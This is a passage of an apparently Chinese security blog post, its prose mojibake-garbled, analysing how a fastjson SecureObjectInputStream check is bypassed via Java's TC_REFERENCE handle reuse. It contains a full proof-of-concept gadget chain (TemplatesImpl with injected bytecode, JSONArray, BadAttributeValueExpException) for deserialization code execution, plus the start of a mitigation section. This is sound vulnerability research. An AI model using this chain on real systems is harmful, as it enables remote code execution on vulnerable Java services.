</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TemplatesImpl</span><span class="w"> </span><span class="n">templates</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">TemplatesImpl</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">JdbcRowSetImpl</span><span class="w"> </span><span class="n">url</span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">JdbcRowSetImpl</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">JSONArray</span><span class="w"> </span><span class="n">objects</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">JSONArray</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">objects</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">url</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ArrayList</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span><span class="w"> </span><span class="n">arrayList</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ArrayList</span><span class="o">&lt;&gt;</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">arrayList</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">templates</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">arrayList</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">objects</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FileOutputStream</span><span class="w"> </span><span class="n">fos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="s">&#34;bin&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">oos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">fos</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">arrayList</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// ä»æ–‡ä»¶ä¸­ååºåˆ—åŒ–å¯¹è±¡</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FileInputStream</span><span class="w"> </span><span class="n">fis</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="s">&#34;bin&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">ois</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="p">(</span><span class="n">fis</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ois</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ois</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p><img loading="lazy" src="images/image-20250303175356286.png" alt="image-20250303175356286"  />
</p>
<p>å…¶å®å½“æ—¶çœ‹æ„Ÿè§‰å¼€å‘å¤„ç†çš„å¾ˆå¥½ï¼Œå› ä¸ºè¿™ç§ä¸ä¼šå½±å“åˆ°æ­£å¸¸çš„ååºåˆ—åŒ–ï¼Œå±€éƒ¨çš„è¿›è¡Œäº†æ£€æµ‹ã€‚</p>
<p>ç„¶åè¿˜æœ‰ä¸€ç‚¹ï¼Œæˆ‘ä»¬è¦åˆ©ç”¨<code>TemplatesImpl</code>è‚¯å®šæ˜¯è¦æ”¾åˆ°<code>ArrayList</code>ä¸­çš„ï¼Œé‚£ä¸Šé¢æœ‰ä»€ä¹ˆç”¨å‘¢ï¼Œå¾…æˆ‘æ…¢æ…¢é“æ¥</p>
<blockquote>
<p>è¿™æ˜¯å› ä¸ºï¼Œ<code>javaååºåˆ—åŒ–</code>ä¸­ä¸ºäº†<code>æé«˜æ•ˆç‡</code>ï¼Œ<code>ååºåˆ—åŒ–è¿‡ä¸€æ¬¡çš„å¯¹è±¡</code>ä¼šæ”¾åˆ°ä¸€ä¸ª<code>ç±»ä¼¼Mapçš„å‚æ•°</code>ä¸­ï¼Œä¸‹ä¸€æ¬¡ååºåˆ—åŒ–åˆ°è¿™ä¸ªå¯¹è±¡æ—¶ï¼Œåˆ™ä¼šç›´æ¥ä»è¿™ä¸ªMapä¸­è·å–å¯¹åº”çš„å¯¹è±¡ï¼Œè€Œä¸ä¼šå†èµ°<code>ç¬¬ä¸€æ¬¡å¤„ç†ååºåˆ—åŒ–çš„æµç¨‹</code>ï¼Œè€Œ<code>resolveClass</code>çš„å¤„ç†æ˜¯åœ¨<code>ç¬¬ä¸€æ¬¡ååºåˆ—åŒ–</code>ä¸­è¿›è¡Œ<code>æ£€æµ‹</code>çš„ï¼Œå¹¶ä¸ä¼šåœ¨ç¬¬äºŒæ¬¡ä¸­è¿›è¡Œæ£€æµ‹</p>
<p>æ‰€ä»¥æˆ‘ä»¬å…ˆé€šè¿‡<code>ObjectInputStream</code>å¸®æˆ‘ä»¬å®ç°ç¬¬ä¸€æ¬¡ååºåˆ—åŒ–ï¼Œç¬¬ä¸€æ¬¡ååºåˆ—åŒ–æ£€æµ‹çš„æ˜¯<code>ObjectInputStream#resolveClass</code>å¹¶ä¸ä¼šå¯¹æˆ‘ä»¬çš„ç±»ç…§æˆå½±å“ï¼Œè€Œ<code>SecureObjectInputStream</code>å¤„ç†çš„æ˜¯ç¬¬äºŒæ¬¡ååºåˆ—åŒ–åˆ™å®ç°äº†ç»•è¿‡<code>SecureObjectInputStream#resolveClass</code></p>
</blockquote>
<p>è¿™é—®é¢˜å…¶å®ä¹Ÿè·Ÿjavaååºåˆ—åŒ–çš„è°ƒç”¨å¤„ç†æœ‰å¾ˆå¤§å…³ç³»hhhï¼Œå¦‚æœæ²¡è¿™ä¸ªæœºåˆ¶çš„è¯ï¼Œå…¶å®å¼€å‘è¿™æ ·å†™æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œæˆ‘ä»¬çœ‹çœ‹javaååºåˆ—åŒ–ä¸­æ˜¯æ€ä¹ˆå¤„ç†çš„</p>
<h2 id="javaååºåˆ—åŒ–">javaååºåˆ—åŒ–<a hidden class="anchor" aria-hidden="true" href="#javaååºåˆ—åŒ–">#</a></h2>
<p>readObject0è¿™é‡Œä¼šæœ‰ä¸€ä¸ª<code>switchå¤„ç†</code>ï¼Œç„¶åè¿›è¡Œå¯¹åº”çš„ååºåˆ—åŒ–å¤„ç†</p>
<p><img loading="lazy" src="images/image-20250303181811623.png" alt="image-20250303181811623"  />
</p>
<p>å…ˆçœ‹çœ‹æ­£å¸¸æµç¨‹å§ï¼Œæ­£å¸¸ç±»æ˜¯è¿›å…¥</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">case</span><span class="w"> </span><span class="n">TC_OBJECT</span><span class="p">:</span><span class="o">--&gt;</span><span class="n">readOrdinaryObject</span><span class="p">()</span><span class="o">--&gt;</span><span class="n">readClassDesc</span><span class="p">(</span><span class="kc">false</span><span class="p">)</span><span class="o">--&gt;</span><span class="k">case</span><span class="w"> </span><span class="n">TC_CLASSDESC</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">--&gt;</span><span class="n">readNonProxyDesc</span><span class="p">()</span><span class="o">--&gt;</span><span class="n">resolveClass</span><span class="p">()</span><span class="w"> </span><span class="c1">//è§¦å‘æ£€æµ‹</span><span class="w">
</span></span></span></code></pre></div><p><img loading="lazy" src="images/image-20250303182317970.png" alt="image-20250303182317970"  />
</p>
<p>ç„¶åæˆ‘ä»¬æ˜¯è¦<code>é¿å…æ£€æµ‹</code>çš„ï¼Œå¦‚æœä»<code>readClassDesc()</code>å‡ºå‘çš„è¯ï¼Œå…¶å®åªå‰©<code>TC_REFERENCE</code>å¯ä»¥çœ‹çœ‹äº†</p>
<p><code>TC_NULL</code>æ˜¯è¿”å›<code>null</code>çš„</p>
<p><code>TC_PROXYCLASSDESC</code>æ˜¯<code>å¤„ç†ä»£ç†ç±»</code>çš„ï¼Œè€Œä»£ç†ç±»ï¼Œ<code>SecureObjectInputStream</code>ä¹Ÿæ˜¯åšäº†æ£€æµ‹çš„</p>
<blockquote>
<p>è€Œ<code>TC_REFERENCE</code>æ­£æ˜¯å¤„ç†å·²ç»ååºåˆ—åŒ–è¿‡çš„ç±»ï¼Œè¿™é‡Œçš„<code>TC_REFERENCE</code>å…¶å®å’Œ<code>readObject0</code>ä¸­<code>TC_REFERENCE</code>å¤„ç†æ˜¯ä¸€æ ·çš„ã€‚å¾€ä¸Šæ¨ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬è¦é¿å…<code>readClassDesc()</code>æ–¹æ³•ï¼Œé‚£ä¹ˆå…¶å®<code>readObject0</code>å°±åªå‰©<code>TC_REFERENCE</code>çš„è°ƒç”¨äº†ï¼ŒæŸ¥çœ‹å¯¹åº”<code>readHandle()</code>æ–¹æ³•</p>
</blockquote>
<p><img loading="lazy" src="images/image-20250303183830307.png" alt="image-20250303183830307"  />
</p>
<p>è¿™é‡Œ<code>handles.lookupObject</code>è·å–<code>handles.entries</code>ä¸­å¯¹åº”çš„å¯¹è±¡,å¹¶returnã€‚é‚£æˆ‘ä»¬å†çœ‹çœ‹è¿™äº›å€¼æ˜¯æ€ä¹ˆæ·»åŠ è¿›å»çš„</p>
<p><code>handles.entries</code>çš„å€¼ä¸€èˆ¬é€šè¿‡ä¸‹å›¾ä¸­ï¼Œ<code>handles.assign</code>æ·»åŠ </p>
<p><img loading="lazy" src="images/image-20250303184249418.png" alt="image-20250303184249418"  />
</p>
<p>ä¸Šå›¾å°±æ˜¯æ­£å¸¸å¤„ç†å®Œååºåˆ—åŒ–åï¼Œå°†<code>ååºåˆ—åŒ–åçš„å¯¹è±¡</code>å­˜å‚¨åˆ°<code>handles</code>ä¸­ï¼Œæ–¹ä¾¿ç¬¬äºŒæ¬¡å¤„ç†åŒä¸€ä¸ªç±»æ—¶ç›´æ¥è°ƒç”¨</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kt">int</span><span class="w"> </span><span class="nf">assign</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">size</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="n">entries</span><span class="p">.</span><span class="na">length</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">grow</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">status</span><span class="o">[</span><span class="n">size</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">STATUS_UNKNOWN</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">entries</span><span class="o">[</span><span class="n">size</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">obj</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">size</span><span class="o">++</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>ç„¶åå°±æ˜¯pocç¯èŠ‚å•¦</p>
<h2 id="poc">poc<a hidden class="anchor" aria-hidden="true" href="#poc">#</a></h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">ArrayList</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span><span class="w"> </span><span class="n">arrayList</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ArrayList</span><span class="o">&lt;&gt;</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">arrayList</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">templates</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">arrayList</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">o1</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></div><p>è¿™é‡Œä¸»è¦å°±æ˜¯<code>å…ˆ</code>è®©<code>ObjectInputStream</code>å°†<code>TemplatesImpl</code>ååºåˆ—åŒ–ä¸€æ¬¡ï¼Œå†äº¤ç»™<code>SecureObjectInputStream</code>å¤„ç†ï¼Œç„¶åcaseé‚£äº›byteï¼Œ<code>javaåºåˆ—åŒ–</code>ä¼šå¸®æˆ‘ä»¬å®Œæˆã€‚å½“ç„¶è¿™é‡Œä¸æ­¢listï¼Œåªè¦æ˜¯å¯ä»¥å­˜å‚¨å¤šä¸ªå¯¹è±¡çš„éƒ½å¯ä»¥ï¼Œç„¶åè®©<code>TemplatesImpl</code>å…ˆååºåˆ—åŒ–å³å¯</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSONArray</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javassist.ClassPool</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javassist.CtClass</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileInputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileOutputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectInputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectOutputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Constructor</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Field</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.ArrayList</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Base64</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Learn2</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ClassPool</span><span class="w"> </span><span class="n">pool</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ClassPool</span><span class="p">.</span><span class="na">getDefault</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">CtClass</span><span class="w"> </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pool</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">Evil</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getName</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">code</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz</span><span class="p">.</span><span class="na">toBytecode</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">Base64</span><span class="p">.</span><span class="na">getEncoder</span><span class="p">().</span><span class="na">encodeToString</span><span class="p">(</span><span class="n">code</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TemplatesImpl</span><span class="w"> </span><span class="n">templates</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">TemplatesImpl</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFiled</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="s">&#34;_name&#34;</span><span class="p">,</span><span class="s">&#34;111&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFiled</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="s">&#34;_bytecodes&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="kt">byte</span><span class="o">[][]</span><span class="p">{</span><span class="n">code</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">JSONArray</span><span class="w"> </span><span class="n">objects</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">JSONArray</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">objects</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">templates</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">aClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;javax.management.BadAttributeValueExpException&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Constructor</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">o</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">aClass</span><span class="p">.</span><span class="na">getDeclaredConstructor</span><span class="p">(</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">o</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">o1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">o</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">11</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">val</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">aClass</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;val&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">val</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">val</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">o1</span><span class="p">,</span><span class="w"> </span><span class="n">objects</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ArrayList</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span><span class="w"> </span><span class="n">arrayList</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ArrayList</span><span class="o">&lt;&gt;</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">arrayList</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">templates</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">arrayList</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">o1</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FileOutputStream</span><span class="w"> </span><span class="n">fos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="s">&#34;bin&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">oos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">fos</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">arrayList</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// ä»æ–‡ä»¶ä¸­ååºåˆ—åŒ–å¯¹è±¡</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FileInputStream</span><span class="w"> </span><span class="n">fis</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="s">&#34;bin&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">ois</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="p">(</span><span class="n">fis</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ois</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ois</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setFiled</span><span class="p">(</span><span class="n">TemplatesImpl</span><span class="w"> </span><span class="n">templates</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">number</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">NoSuchFieldException</span><span class="p">,</span><span class="w"> </span><span class="n">IllegalAccessException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">declaredField</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TemplatesImpl</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="n">name</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">declaredField</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">declaredField</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="n">number</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><h2 id="å®‰å…¨æ£€æµ‹">å®‰å…¨æ£€æµ‹<a hidden class="anchor" aria-hidden="true" href="#å®‰å…¨æ£€æµ‹">#</a></h2>
<p>é‚£æ€ä¹ˆæ ·æ˜¯å®‰å…¨çš„å‘¢ï¼Œå…¶å®ä¸Šé¢çš„åŸå› å°±æ˜¯ï¼Œä¸æ˜¯æ‰€æœ‰ç¬¬ä¸€æ¬¡ååºåˆ—åŒ–çš„ç´¯éƒ½è¿›è¡Œäº†<code>resolveClassæ£€æµ‹</code></p>
<p>é‚£æ€ä¹ˆæ‰å®‰å…¨ï¼Œä¸‹æ–¹åŠé€šè¿‡<code>SafeObjectInputStream</code>åŒ…è£…ï¼Œå†readObjectå°±å…¨éƒ¨éƒ½è¿›è¡Œ<code>resolveClassæ£€æµ‹</code>äº†</p>
<p>è€Œåœ¨fastjsonä¸­åŠé€šè¿‡<code>SecureObjectInputStream</code>åŒ…è£…ï¼Œä½†æ˜¯è²Œä¼¼å¼€å‘ä¸æ˜¯è¿™æ ·æƒ³ï¼Œå› ä¸ºæˆ‘åå°„å»è°ƒç”¨è¿™ä¸ªæ¥åŒ…è£…ååºåˆ—åŒ–æ—¶ä¼š<code>ç©ºæŒ‡é’ˆæŠ¥é”™</code>ï¼Œé‚£å¼€å‘æ€è·¯åº”è¯¥æ˜¯<code>åº”ç”¨æ›´æ–¹ä¾¿</code>æ¥çš„ï¼Œä¸å¦‚çš„è¯æ¯ä¸ªååºåˆ—åŒ–éƒ½éœ€è¦<code>SecureObjectInputStream</code>åŒ…è£…ï¼Œä¿®æ”¹ä»¥å‰ä»£ç å·¥ç¨‹é‡åº”è¯¥ä¸å°hhh</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">SafeObjectInputStream</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="nf">SafeObjectInputStream</span><span class="p">(</span><span class="n">InputStream</span><span class="w"> </span><span class="n">in</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">super</span><span class="p">(</span><span class="n">in</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
